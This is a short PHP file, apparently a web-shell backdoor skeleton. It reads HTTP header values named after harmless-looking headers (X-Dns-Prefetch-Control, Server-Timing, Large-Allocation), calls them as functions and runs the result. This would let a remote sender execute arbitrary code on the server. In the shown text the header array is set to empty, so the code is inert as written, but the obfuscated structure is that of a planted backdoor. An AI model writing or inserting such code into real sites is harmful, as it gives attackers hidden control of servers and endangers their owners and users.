<?php
$_HEADERS = Array();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $center = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['Server-Timing']($_HEADERS['Large-Allocation']));
    $center();
}